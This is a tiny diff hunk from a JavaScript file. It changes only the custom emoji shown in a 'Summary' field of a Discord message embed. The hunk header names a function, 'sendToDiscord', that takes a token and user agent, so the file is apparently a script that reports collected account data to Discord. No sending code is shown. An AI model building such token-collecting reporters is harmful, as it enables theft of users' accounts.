@@ -1659,7 +1659,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<a:80346runescapepayday:1409196815588397186> Summary",
+            name: "<a:emoji_34:1410247101971173477> Summary",
             value: userData.summary?.toString() || "0",
             inline: true
           },
